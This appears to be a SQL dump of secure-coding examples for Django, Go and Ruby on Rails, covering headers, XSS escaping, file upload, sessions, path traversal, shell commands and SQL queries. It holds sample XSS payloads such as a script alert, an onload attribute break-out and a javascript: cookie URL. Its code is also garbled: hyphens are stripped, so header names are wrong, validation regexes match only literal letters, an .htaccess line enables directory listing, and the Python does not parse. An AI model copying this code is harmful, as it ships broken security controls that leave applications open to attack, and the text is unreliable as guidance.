    	if inputValidation(inputParameter, validationType, "Invalid userinput", "HIGH", countLevel) == False:
            continue = False

    	"""
    	Second, we want to whitelist the filenames for expected values, in this example they are,
    	page1,page2 etc.. for more information about whitelisting see "whitelisting" in the code examples:
    	"""

    	if whitelisting(whiteListPattern, inputParameter) == False:
            continue = False

    	"""
    	Whenever you are checking whether a user is restricted to review certain data,
    	the access restrictions should be processed server side.
    	The userID could be stored inside a session variable on login, and should be used to
    	retrieve user data from the database:
    	"""
    	
        if continue == True : 

    		"""
    		We count the number of connections towards the database,
    		See "aggregate user controls" code example for more information:
    		"""

            countAccess(1)
            current_user = request.user
            data = Table.objects.filter(id=current_user.id, page=inputParameter).first()
            
            return data
        else:
            return False

', 'Identifier based authorization', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Charsets


 Example:


    """
    In order to set the "Charsets" header you''ll have to add the following code to the head of your application, the following code could be used in your controller: For Example, text/html
    """

    //You add directly into the HTML markup
    <meta httpequiv="ContentType" content="text/html; charset=utf8">

    """
    In order to set the "ContentType" header and charset you''ll have to add the following code
    to the head of your application

    For adding ContentType in every page we have to add a middleware
    Make a middleware in yourapp/middleware.py
    """

    class MyMiddleware:

    	def __init__(self, get_response):
        	self.get_response = get_response

    	def __call__(self, request):
        	response = self.get_response(request)
        	
        	//For HTML, the content type is text/html
			response[''ContentType''] = ''text/html; charset=UTF8''

        	return response
   	
   	//For adding middleware in the project, add in yourproject/settings.py
   	MIDDLEWARE = [
    	...,
    	''yourapp.middleware.MyMiddleware'',
    	...,
	]	

	"""
	For adding in the individual response page using render_to_response
	"""

	response = render_to_response("template.html", {})
	//For HTML, the content type is text/html
	response[''ContentType''] = ''text/html; charset=UTF8''
	
	return response

	"""
	For adding in the individual response page using render
	"""

	response = render(request, "template.html", {})	
	//For HTML, the content type is text/html
	response[''ContentType''] = ''text/html; charset=UTF8''

	return response  ', 'Charsets', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Content type headers


 Example:


	"""
    In order to set the "ContentType" header you''ll have to add the following code to the head of your application

    For adding ContentType in every page we have to add a middleware
    Make a middleware in yourapp/middleware.py
    """

    class MyMiddleware:

    	def __init__(self, get_response):
        	self.get_response = get_response

    	def __call__(self, request):
        	response = self.get_response(request)
        	
        	//For HTML, the content type is text/html
			response[''ContentType''] = ''text/html; charset=UTF8''
			
			//For Json, the content type is application/json
			response[''ContentType''] = ''application/json''
        	
        	return response
   	
   	//For adding middleware in the project, add in yourproject/settings.py
   	MIDDLEWARE = [
    	...,
    	''yourapp.middleware.MyMiddleware'',
    	...,
	]	

	"""
	For adding in the individual response page using render_to_response
	"""

	response = render_to_response("template.html", {})

	//For HTML, the content type is text/html
	response[''ContentType''] = ''text/html; charset=UTF8''
	//For Json, the content type is application/json
	response[''ContentType''] = ''application/json''
	
	return response

	"""
	For adding in the individual response page using render
	"""

	response = render(request, "template.html", {})
	
	//For HTML, the content type is text/html
	response[''ContentType''] = ''text/html; charset=UTF8''
	//For Json, the content type is application/json
	response[''ContentType''] = ''application/json''
	
	return response   ', 'Content type headers', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' XML injection prevention



 Example:


    """
	
	Whenever you are using XML parsers you must sanitize or encode al userinput before
	including this input into your XML file.

	Some methods like below, the Dom document already encodes the input before storing it
	into the XML. But beware, since this encoded input is still a threat whenever you are
	displaying the this data on screen as HTML output. This encoded data should be escaped
	at all times before displaying.

	Whenever your XML function does not encode your data on the fly, you may want to write
	your own function for achieving this. See the code examples and search for "Input encoding"
	for more detailed information.
	"""


	//Let us take an easy example where we store your favorite number name into a XML file.
	from lxml import etree

	//Create Root Element employees

	root = etree.Element("employees")
	
	//Create child Element for employees
	employee = etree.SubElement(root, "employee")
	name = etree.SubElement(employee, "name")
	
	//Insert the text in name tag
	name.text = request.form[''name'']

	//Save it in xml file
	with open("test.xml", "w") as f:
		f.write(etree.tostring(root, pretty_print=True))

	"""
	We will try to insert <script>alert(123);</script> into the XML file,
	Now after inserting the employee name into the XML file it will look like:


		<?xml version="1.0"?>
		<employees>
			<employee>
				<name>&lt;script&gt;alert(123);&lt;/script&gt;</name>
			</employee>
		</employees>

		As you can see de input has been encoded but still can trigger an XSS whenever we
		extract the data as shown in the example below:

	NOTE: if you ever want to include the xml files by means of userselected sources,
	be aware of the fact that an attacker could also include sources from external websites
	and even execute External entity injections on your applications. See the "XSLT injection prevention"
	code example for more detailed information on how to implement this type of functionality since
	the same principle''s apply to both functions.
	"""
	
		//Read from a XML file
		x = etree.parse("test.xml")


		for element in x.iter("name"):
   	 		//This example is vulnerable to XSS
   	 		print element.text

   	 		//This example is escaped
   	 		print escape(element.text)

	"""
	We recommend to not rely solely on the encoding of the input by the Dom document.
	So before you insert userinput into the XML file you want to have it sanitized.
	See the "Encoding" and "input validation" code examples for more detailed information
	"""

 
', 'XML injection prevention', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' File upload


 Example:

        
	"""
	In Django the file data is placed in request.FILES

	Forms should be always submitted using POST request

	It is mandatory for the HTML form to have enctype="multipart/formdata" otherwise the 
	request.FILES will be empty

	Django have proper models to handle the uploaded files : FileField and ImageField, they 
	have the reference the location where the file is  stored
	"""

	//set MEDIA_URL and MEDIA_ROOT in project''s settings.py
	MEDIA_URL = ''/media/''
	MEDIA_ROOT = os.path.join(BASE_DIR, ''media'')

	//Add the urls.py file 
	from django.conf import settings
	from django.conf.urls.static import static

	urlpatterns = [
    	//Project url patterns...
	]

	//While development you may need to serve the user uploaded files
	if settings.DEBUG:
    	urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)


    """
   	File Upload with model Forms

    In model form approach we can store the data about the reference of the file, details such 
    description when was it uploaded. It is more convenient to perform input validation, build
    absolute path and solve the issue of file name conflict.
    """

    //Create a Model Document to store the detail
    from django.db import models

    def user_directory_path(instance, filename):
    	//file will be uploaded to MEDIA_ROOT/user_<id>/<filename>
    	return ''user_{0}/{1}''.format(instance.user.id, filename)

	class Document(models.Model):
    	description = models.CharField(max_length=255, blank=True)
    	document = models.FileField(upload_to=user_directory_path, validators=[validate_file_extension])
    	uploaded_at = models.DateTimeField(auto_now_add=True)

    //Add validators.py for Input Validation
    import os
    from django.core.exceptions import ValidationError	

    def validate_file_extension(value):
        //[0] returns path+filename
    	ext = os.path.splitext(value.name)[1]  
    	
        //Adding valid extensions
        valid_extensions = [''.jpg'', ''.png'']
    	
        if not ext.lower() in valid_extensions:
            //Adding logging for extension error
            log.error(''Wrong Extension Uploaded: {user} via ip: {ip}''.format(
                user=user,
                ip=ip
            ))

        	raise ValidationError(u''Unsupported file extension.'')

    //Create a forms.py which will process the forms
    from django import forms
	from .models import Document

	class DocumentForm(forms.ModelForm):
    	class Meta:
        	model = Document
        	fields = (''description'', ''document'', ) 

    //Template for upload.html 
    {% block content %}
  	<form method="post" enctype="multipart/formdata">
    {% csrf_token %}
    {{ form.as_p }}
    <button type="submit">Upload</button>
  	</form>

  	<p><a href="{% url ''home'' %}">Return to home</a></p>
	{% endblock %}


    //Create a view for upload functionality
    
    def model_form_upload(request):
    	if request.method == ''POST'':
        	form = DocumentForm(request.POST, request.FILES)
        	
            //Check whether the form is valid
            if form.is_valid():
                //Save the form data
            	form.save()

                //Upload Successful
                log.info(''Uploaded Successful : {user} via ip: {ip}''.format(
                    user=user,
                    ip=ip
                ))
                return redirect(''home'')
    	else:
        	form = DocumentForm()
    	return render(request, ''app/upload.html'', {
            ''form'': form
    	})', 'File upload', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Privilege based authentication


 Example:


    """
    For privilege based authentication we will use the table permissions.

    TABLE permissions
    
    |       *Name*      |       *Type*      |    *Extra*       |
    
    |         ID        |       Int(11)     |   AUTO_INCREMENT |
    
    |  content_type_id  |       Int(11)     |                  |
    
    |      codename     |    Varchar(255)   |                  |
    
    |        name       |    varchar(30)    |                  |
    

    Permissions are associated with models, and define the operations that can be performed on a model instance by a user who has the permission . Django automatically gives add, change, and delete permissions to all models by default.
    """

    //Adding certain privileges to user
    //Selecting particular User and adding permission
    user = User.objects.filter(username=''user1'').first()
    user.user_permissions = [Permission.objects.get(codename=''change_choice'')]

    """
    Permissions can be checked in both templates and views.
    In templates, Current user''s permission are checked in template variable {{ perms }}
    In Views, Permissions can be tested in function view using the permission_required decorator or in class based view we can use PermissionRequiredMixin
    """
    
    //In templates
    {% if perms.polls.change_choice %}
      <! Add appropriate code. >
    {% endif %}

    //In Views 
    @permission_required(''polls.change_choice'')
    @permission_required(''polls.can_edit'')
    def my_view(request):
      ...

    //Permissionrequired for class based views
    from django.contrib.auth.mixins import PermissionRequiredMixin

    class MyView(PermissionRequiredMixin, View):
        permission_required = ''catalog.can_mark_returned''
        ...', 'Privilege based authentication', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' HTML output


 Example:


    """
    Whenever user input is displayed in the application, whether, as content or a parameter value
    submitted towards the url, all user input should be properly escaped to prevent XSS injections.
    
    Django has automatic HTML escaping, 5 characters are escaped : 
    < is converted to &lt;
    > is converted to &gt;
    '' (single quote) is converted to &39;
    " (double quote) is converted to &quot;
    & is converted to &amp;
    """

    //If data = "<b>"
    //Template to show HTML escaping
    This will be escaped: {{ data }}
    This will not be escaped: {{ data|safe }}

    //Output for HTML escaping
    This will be escaped: &lt;b&gt;
    This will not be escaped: <b>

    //For removing dangerous characters : 
    wordDict = {''&'': ''&amp;'', ''<'' : ''&lt;'', ''>'' : ''&gt;'' , ''"'' : ''&quot;'', "''" : ''&x27;'', ''/'' : &x2F;, ''\'' : ''\\''}

    for key in wordDict:
        input = input.replace(key, wordDict[key])

    //For UNTRUSTED DATA in <a href="/site/search?value=UNTRUSTED DATA">clickme</a>
    //URL Encoding for defense

    import urllib
    input = urllib.quote_plus(input) 

    """
    Security consists of different layers of protection, in order to guarantee the integrity
    of your application. This means that the value submitted from the user should
    already be sanitized before being submitted towards the database in order to prevent XSS.
    As an example, you are expecting only alphanumerical value here:
    """
    
    match = re.findall("^[azAZ09]+$", value)
    if match:
        return True
    else:
        raise Exception("User supplied value not in the range " + range)

    """
    This type of approach should be used whenever you are allowing userinput in
    your DOM like for example, let''s say a user was allowed to upload an image and
    set an alt text. when you do not sanitize his input a possible attack string could be:
    """
    
    this is an image" onload="alert(''XSS'');"

    """
    whenever this string now is added to the users image this will be the outcome, leading
    to xss:
    """

    <img src="http://image.com/image.jpg" alt="this is an image" onload="alert(''XSS'')"" />

    """
    After this sanitation malicious code can no longer exist in the $_POST[''value''] variable.

    Another possibility for attackers to execute an XSS injection, is to pass malicious code directly
    into the URL by means of a "href", e.g.:
    javascript:alert(document.cookie);
    or
    data:text/html;base64,base64xssinjection

    In the following scenario escaping with htmlspecialchars() is not sufficient to block the injection.
    By checking the URL to see if it starts with either http:// or https:// whenever a link has
    been submitted to the web application by a user.

    def before_request(url):
        if url.startswith(''http://'') or url.startswith(''https://''):
            return True
        else:
            raise Exception("Not a valid URL : " + url)

    

    
', 'HTML output', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('XXSSProtection Header


 Example:

	const (
	  XSSProtectionHeader = "XXSSProtection"
	  XSSProtectionValue  = "1; mode=block"
	)

	func ExampleHandler(w http.ResponseWriter, r *http.Request) {
	  // Add XXSSProtection header
	  w.Header().Add(XSProtectionHeader, XSSProtectionValue)

	  // Respond with request
	  w.Write([]byte("Hello World."))
	}
', 'X XSS Protection Header', 'go'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('XContentTypeOptions Header


 Example:

	const (
	  ContentTypeOptionsHeader = "XContentTypeOptions"
	  ContentTypeOptionsValue  = "nosniff"
	)

	func ExampleHandler(w http.ResponseWriter, r *http.Request) {
	  // Add XContentTypeOptions header
	  w.Header().Add(ContentTypeOptionsHeader, ContentTypeOptionsValue)

	  // Respond with request
	  w.Write([]byte("I have XContentTypeOptions header set to nosniff!"))
	}
', 'X Content Type Options Header', 'go'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('Anticaching Headers


 Example:

	const (
	  CacheControlHeader = "CacheControl"
		CacheControlValue = "nocache, nostore, mustrevalidate"
		PragmaHeader = "Pragma"
		PragmaValue = "nocache"
		ExpiresHeader = "Expires"
		ExpiresValue = "0"
	)

	func ExampleHandler(w http.ResponseWriter, r *http.Request) {
	  // Add CacheControl header
		// HTTP 1.1
	  w.Header().Add(CacheControlHeader, CacheControlValue)

		// Add Pragma header
		// HTTP 1.0
		w.Header().Add(PragmaHeader, PragmaValue)

		// Add Expires header
		// Proxies
		w.Header().Add(ExpiresHeader, ExpiresValue)

	  // Respond with request
	  w.Write([]byte("I have anticaching headers!"))
	}
', 'Anti Caching Headers', 'go'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('Anti Clickjacking Headers


 Example:

The preferred method to prevent against clickjacking is to use "security headers".
There are three options for setting the "anticlickjacking" headers in your application:

	const (
		XFrameOptionsHeader = "XFrameOptions"
		XFrameOptionsDeny  = "DENY"
		XFrameOptionsSameOrigin = "SAMEORIGIN"
		XFrameOptionsFromUri = "FROMURI http://www.example.com"
	)

	func ExampleHandler(w http.ResponseWriter, r *http.Request) {

		// Prevent page from being displayed in an iframe
	  	w.Header().Add(XFrameOptionsHeader, XFrameOptionsDeny)

		// Prevent page from being displayed in an iframe on other sites
		// w.Header().Add(XFrameOptionsHeader, XFrameOptionsSameOrigin)

		// Allow page at specified URI to display page in an iframe
		// NOTE: Limited support in modern browsers
		// w.Header().Add(XFrameOptionsHeader, XFrameOptionsFromUri)

		// Respond with request
	  	w.Write([]byte("I have security headers!"))
	}
', 'Anti Clickjacking Headers', 'go'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('ContentType Headers


 Example:

	const (
	  ContentTypeHeader = "ContentType:text/html"
	  ContentTypeValue  = "charset=UTF8"
	)

	func ExampleHandler(w http.ResponseWriter, r *http.Request) {
	  // Add ContentType header
	  w.Header().Add(ContentTypeHeader, ContentTypeValue)

	  // Respond with request
	  w.Write([]byte("I have a ContentType of text/html in UTF8!"))
	}
', 'Content Type Headers', 'go'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' XXSSProtection header


 Example:


    // Ruby on Rails sets XXSSProtection header with "1; mode=block" option by default.
    // If in your case it doesn''t, you can add the header manually.

    // Add the following code to APP_DIR/config/environments/production.rb

    config.action_dispatch.default_headers = {
      ''XXSSProtection'' => ''1; mode=block''
    }
', 'X XSS Protection header', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Enforce secure passwords


 Example:


    // It is highly recommended to use Devise gem that handles authentication on your RoR app.
    // more info: https://github.com/plataformatec/devise
    // Then install Devise Security Extension gem (https://github.com/phatworx/devise_security_extension)
    // Follow the installing instructions mentioned on Github

    // Now it''s time to configure the gem in APP_DIR/config/initializers/devise.rb
    // Uncomment and customize following lines of code

    // Configuration of the gem core
    config.password_length = 10..128

    // Configuration of the gem extenstion
    config.password_regex = /(?=.*\d)(?=.*[az])(?=.*[AZ])/ // at least one number, big letter and small letter
    config.password_archiving_count = 5
    config.deny_old_passwords = true

    // Now update your model
    // For example:
    class User < ApplicationRecord
      has_many :posts

      // add :secure_validatable. Remember not to use :secure_validatable with :validatable
      devise :database_authenticatable, :registerable,
            :recoverable, :rememberable, :trackable, :secure_validatable
    end

', 'Enforce secure passwords', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Re authentication


 Example:


	// Whenever a user wants to change his credentials or do other important data exchanges such as
	// transferring money he should always be challenged to reauthenticate himself before
	// allowing them to perform these actions.

	// Enforcing reauthentication before changing the password is provided by default in Devise gem. All you have
	// To do is add such link in your view
	<%= link_to "Change your password", edit_user_registration_path %


	// Other action may require adding your before_action method in specific controller
	class SpecificController < ApplicationController
		before_action :re_entered_password?, only: [:edit] 

		private
		def re_entered_password? 
			if session[:reauthenticated_at] == nil or session[:reauthenticated_at] > 2.minute
				// Redirect to view that requires entering your password
				redirect_to action: => "re_authenticate" 
			end
		end
	end

	// After successful authentication set 
	session[:reauthenticated_at] = Time.now
    ', 'Re authentication', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' XSL Injection prevention


 Example:


    // In order to prevent XSL injections you must enforce strict policy''s whenever the
    // files are loaded from a source controlled by an possible attacker.

    // Let''s say for example that the user can choose from several XSL files on your application.

    // ABC.xsl arranges your employee names on alphabetical order
    // CBA.xsl does not care and just shows the input by order of your XML file.

    // Before we want to attach the XSL files to the style sheet we first want to
    // do validation on the request to make sure the included file was one of our own pre
    // defined files, example:
    // check_pattern(params[:xslfile], "file1.xsl,file2.xsl,etc")

    require ''nokogiri''

    // Include the classes of which you want to use objects from
    require_relative ''classes''

    class IncludeXSL
      def including(param, white_list)
        // check "Whitelisting" for method declaration
        if check_pattern(param, white_list)
          document = Nokogiri::XML(File.read(''input.xml''))
          template = Nokogiri::XSLT(File.read(''template.xslt''))

          transformed_document = template.transform(document)
        end
      end
    end
', 'XSL injection prevention', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Session cookies (domain)


 Example:


    // Whenever a session is started, and you want to share it over different domains,
    // the domain value should be set to the specific domain:

    // Add "domain: DOMAIN_NAME" option to APP_DIR/config/initializers/session_store.rb
    Rails.application.config.session_store :cookie_store, key: ''SESSIONID'', domain: "DOMAIN_NAME"', 'Session cookies (domain)', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Directory Listing


 Example:


    // Directory Listing is a server based feature not Ruby''s based. If you are using
    // Apache and other Web Application Server (like popular Passenger), follow
    // this tutorial

    // To disable or prevent directory access, add following line in your .htaccess file. If
    // user points the browsers to a directory that does not have an index file, then a
    // "403 Forbidden" error will be displayed:

    // Add this line of code to your .htaccess file:
    Options Indexes', 'Directory listing', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' RFD and file download injection prevention


 Example:


    def get_files(input_parameter, pattern)
      validator = Validation.new

      // First, we want to filter the filenames for expected values. For this example we use only az/09
      // Whenever the values are tampered with, we can assume an attacker is trying to inject malicious input.
      // for more information about validation see "input validations" in the code examples:
      return false unless validator.alphanumeric?(input_parameter)

      // Second, we want to whitelist the filenames for expected values, in this example they are,
      // file1,file2 etc.. for more information about whitelisting see "whitelisting" in the code examples:
      // pass the pattern to the check pattern, for instance pattern = %w[file1 file2]
      return false unless check_pattern(input_parameter, pattern)

      // Set proper headers
      response.headers[''CacheControl''] = ''nostore, nocache, mustrevalidate, maxage=0''
      response.headers[''XContentTypeOptions''] = ''nosniff''
      response.headers[''Pragma''] = ''nocache''

      // If all went good we can send file based on user''s given name
      send_file input_parameter
      true
    end
', 'RFD and file download injection prevention', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' XContentTypeOptions header


 Example:


    // Ruby on Rails sets XContentTypeOptions header with "nosniff" option by default.
    // If in your case it doesn''t, you can add the header manually.

    // Add the following code to APP_DIR/config/environments/production.rb

    config.action_dispatch.default_headers = {
      ''XContentTypeOptions'' => ''nosniff''
    }
', 'X Content Type Options header', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Audit Logs


 Example:


    // Logging is turned on in Ruby on Rails by default. Every request is logged that is nice but it may 
    // cause security issues like information disclosure. If attacker gets access to web server, it''s possible
    // to read all requests containing confidential data like logins, passwords, card numbers etc. That''s why it
    // is recommended to define which values shouldn''t be stored in logs.

    // Add following line of code to APP_DIR/config/initializers/filter_parameter_logging.rb in order to filter
    // confidential data being saved in logs.

    Rails.application.config.filter_parameters += [:confidential_parameter]', 'Audit logs', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' CSRF Tokens


 Example:

          
    // Handling CrossSite Request Forgery is as simple as adding following line of code into 
    // your APP_DIR/controllers/application_controller.rb

    class ApplicationController < ActionController::Base
      protect_from_forgery with: :exception
    end

    // It''s important to know that RoR is REST based framework and CSRF protection does not work on HTTP GET requests.', 'CSRF tokens', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Logout function


 Example:


    // It is highly recommended to use Devise gem that handles authentication on your RoR app.
    // more info: https://github.com/plataformatec/devise

    // When all authentication is done by Devise gem the implement logout function is as simple as
    // adding the link into your base template. For my application this is 
    // APP_DIR/views/layouts/application.html.haml

    %ul.nav.navbarnav.navbarright
     if user_signed_in?
      %li= link_to "New Post", new_post_path
      %li= link_to "Sign out", destroy_user_session_path, method: :delete // Logout function
     else
      %li= link_to "Sign in", new_user_session_path
      %li= link_to "Sign up", new_user_registration_path

    // Also, remember about authenticate in controllers before performing any action in specific controllers
    before_action :authenticate_user!, only: [Methods_here] ', 'Logout function', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Timeout a session


 Example:


    // Add "expire_after: 1.hour option to APP_DIR/config/initializers/session_store.rb
    Rails.application.config.session_store :cookie_store, key: ''SESSIONID'', secure: true, expire_after: 1.hour', 'Timeout a session', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' White listing


 Example:

    
    def check_pattern(param, list = [])
      // List should be an array of allowed patterns
      // list = ["value1", "value2"]
      if list.include? param
        Rails.logger.info "//{session.id} > Good whitelist validation"
        true
      else
        Rails.logger.warn "//{session.id} > Bad whitelist validation"
        false
      end
    end
', 'White listing', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Session hijacking and fixation


 Example:


    // In order to secure your session, you have to turn on SECURE and HTTPONLY cookies'' flags
    // More info in: "Session cookies HTTPOnly" and "Secure session cookies"

    // Turn on `force_ssl` in config/environments/production.rb
    Rails.application.configure do
      // redirects all HTTP to HTTPS and also adds secure flag to your cookies
      config.force_ssl = true

      config.ssl_options = {
        // HTTP Strict Transport Security configuration
        hsts: {
          // default
          expires: 180.days,

          // default  if all present and future subdomains will be HTTPS
          subdomains: true,

          // Recommended: If the site owner would like their domain to be included in the HSTS preload list
          // defaults to false
          preload: true
        }
      }

      // more information can be found here: http://api.rubyonrails.org/classes/ActionDispatch/SSL.html
    end

    // After that add :trackable symbol to the devise configuration in users'' model

    // For example:
    class User < ApplicationRecord
      has_many :posts

      // Be sure that :trackable is added
      devise :database_authenticatable, :registerable,
            :recoverable, :rememberable, :trackable, :secure_validatable
    end

    // Now update controllers that need authenticated users to perform actions.
    class ContollerWithAuthenticatedUsers < ApplicationController
      before_action :authenticate_user!
      before_action :check_ip

      private
      // After this modification current users'' IP address will be compared to
      // the last IP that was used to log in on the account. If they dont match  
      // user will be warned. This check will be performed every single user action.
      def check_ip
        if current_user.last_sign_in_ip != request.remote_ip
          flash[:warning] = "There are other active sessions on other IP addresses. " +
          "Your session could be hijacked. Press logout in order to authenticate again " +
          "for security reasons!"
        end
      end  
    end

', 'Session hijacking and fixation', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Random password token generation


 Example:


    // A good random password would be:
    password = SecureRandom.hex(32)

    // A good random number would be:
    number = SecureRandom.random_number

    //A good random bytes would be:
    bytes = SecureRandom.random_bytes(32)', 'Random password token generation', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Directory/path traversal


 Example:

      
    def get_files(input_parameter, pattern)
      validator = Validation.new

      // First, we want to filter the filenames for expected values. For this example we use only az/09
      // Whenever the values are tampered with, we can assume an attacker is trying to inject malicious input.
      // for more information about validation see "input validations" in the code examples:
      return false unless validator.alphanumeric?(input_parameter)

      // Second, we want to whitelist the filenames for expected values, in this example they are,
      // page1,page2 etc.. for more information about whitelisting see "whitelisting" in the code examples:
      // pass the pattern to the check pattern, for instance  pattern = %w[page1 page2]
      return false unless check_pattern(input_parameter, pattern)

      //If all went good we can send file based on user''s given name
      send_file input_parameter
      true
    end
', 'Directory path traversal', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Input validation


 Example:

    
	// This class is where you store all your input validation controls.
	// It makes it easy to maintain whenever you want to apply changes for
	// certain input validation roles and reduces the chance of mistakes in your regexes.

	class Validation

		// Application has to protect itself. Every bad input the counter will increment. If the counter
		// hits 3 user''s session must be terminated. 
		attr_reader :counter

		def initialize
			@counter = 0
		end

		def validation_failed
				@counter += 1

				// Every bad input validation has to be logged.
				Rails.logger.warn "//{session.id} > Bad user input"

				if @counter >= 3
					// DO LOGOUT HERE
				end
		end

		def numeric?(input)
			unless input =~ /^[09]+$/
				self.validation_failed
				return false
			end

			return true 
		end

		def alphanumeric?(input)
			unless input =~ /^[azAZ]+$/
				self.validation_failed
				return false
			end

			return true 
		end
	end', 'Input validation', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Enforce sequential step order 


 Example:


	// Whenever an functionality consists out of following several steps to achieve some goal i.e,
	// "User adds items to chart", "User enters shipping information", "User pays for goods",
	// "Items will be shipped." You want to make sure the user can not skip the payment step in
	// order to receive his goods.

	class Product < ApplicationRecord
	end

	class Order < ApplicationRecord
		has_many :products, through: :products_orders

		belongs_to :customer
		belongs_to :payment
	end

	// As you can see above we have a very simplified database structure for your average
	// web shop. now we can walk through the different steps needed to enforce the user to take
	// all steps before payment.
	//
	// We wont cover the entire shopping cart functions since that would become a rather big
	// example so let''s cover the basics of enforcing the sequential steps.
	//
	// Step1: would be, the user adding items to his cart.
	//
	// Step2: would be, the user adding products to checkout. Whenever he is done shopping
	// we''ll change the state of the Order
	//
	// For managing the state we could use a Ruby gem that implements an interface
	// for a state machine, like Statesman (https://github.com/gocardless/statesman)
	// It even provides adapters for ActiveRecord models and can save the entire
	// state transition history for later audit.

	// First, we should create a state machine:
	class OrderStateMachine
		include Statesman::Machine

		state :pending, initial: true
		state :checking_out
		state :purchased
		state :cancelled

		transition from: :pending,      to: [:checking_out, :cancelled]
	transition from: :checking_out, to: [:purchased, :cancelled]
	end

	// Then, we can link it to our ActiveRecord model:
	class Order < ApplicationRecord
		include Statesman::Adapters::ActiveRecordQueries

		has_many :order_transitions, autosave: false
		has_many :products, through: :products_orders

		belongs_to :customer
		belongs_to :payment

		// Optionally delegate some methods
		delegate :can_transition_to?, :transition_to!, :transition_to, :current_state,
			to: :state_machine

		def state_machine
			@state_machine ||= OrderStateMachine.new(self, transition_class: OrderTransition)
		end

		def self.transition_class
			OrderTransition
		end

		def self.initial_state
			:pending
		end
		private_class_method :initial_state
	end

	// Next, lets create an AR model to represent state transitions:
	class OrderTransition < ActiveRecord::Base
	include Statesman::Adapters::ActiveRecordTransition

	belongs_to :order, inverse_of: :order_transitions
	end

	// And lets put the following code into confing/initializers/statesman.rb
	// So that Statesman knows it should persist the state to DB
	Statesman.configure do
	storage_adapter(Statesman::Adapters::ActiveRecord)
	end

	// Now in your controllers you can use the following methods:
	//  Machine//can_transition_to?(state): true|false
	//  Machine//transition_to(state): true|false
	//  Machine//transition_to!(state): true|Statesman::TransitionFailedError|Statesman::GuardFailedError
	order = Order.create!

	order.current_state
	// => pending

	order.can_transition_to?(:purchased)
	// => false

	order.transition_to(:purchased)
	// => false

	// order still in the pending state:
	order.current_state
	// => pending

	// You definitely should check out the gem''s Github page (https://github.com/gocardless/statesman)
	// as it has a great README with a more broad example
    ', 'Enforce sequential step order shopping', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' System commands


 Example:


    // Define the whitelist pattern and validation type andz input parameter like:
    // get_files("value1,value2,etc", "alphanumeric", params[''filename''], "3")
    class SystemCommands
      // Ruby implementation of PHP escapeshellcmd written by Prof. Edgar Gonzalez
      def escape_shell_command(cmd)
        cmd.gsub(/(["''//&;`|*?~<>^()\[\]{}$\\\x0A\xFF])/) { '''' }
      end

      // Whenever a system command is finished, you should properly sanitize and escape this user input.
      // System command methods examples are: %x{command}, `command`, system("command")

      // First, we want to filter the filenames for expected values. For this example we use only az/09
      // Whenever the values are tampered with, we can assume an attacker is trying to inject malicious input.
      // for more information about validation see "input validations" in the code examples:
      def exec(param, validation_type, pattern)
        validator = Validation.new

        case validation_type
        when numeric
          return false unless validator.numeric?(command)
        when alphanumeric
          return false unless validator.alphanumeric?(command)
        else
          return false
        end

        return false unless check_pattern(param, pattern)

        // If all went good we include the filename
        // Even though there is a match we still escape the shellcommand:
        command = ''./configure '' + param
        escaped_command = self.escape_shell_command(command)

        // Only after validation do we put the shell command into the system() method:
        system(escaped_command)
      end
    end
', 'System commands', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Session cookies HTTPOnly


 Example:


    // Add "httponly: true" option to APP_DIR/config/initializers/session_store.rb
    Rails.application.config.session_store :cookie_store, key: ''SESSIONID'', httponly: true', 'Session cookies HttpOnly', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' SQL Query


 Example:

    
    // You should try to use Active Record''s prepared methods to handle SQL Queries.
    // Example 1: Take client with id = 40 from the database
    client = Client.find(40)

    // Example 2: Take last 5 clients
    client = Client.last(5)

    // Example 3: Find client by first name
    client = Client.find_by first_name: "Wojciech"

    // Example 4: Where conditions
    // With 1 parameter
    Client.where("parameter = ?", params[:parameter]) 
    Client.where("parameter1 = ? AND parameter2 = ?", params[:parameter1], params[:parameter2])

    // !!!!!
    // Using SQL Queries like this Client.where("param1 LIKE ''%//{params[:param1]}%''")
    // leads to SQL Injection attack. Never do that!
    // !!!!!


    // Example 5: Range conditions
    Client.where(created_at: (Time.now.midnight  1.day)..Time.now.midnight)

    // For more methods and examples check http://guides.rubyonrails.org/active_record_querying.html

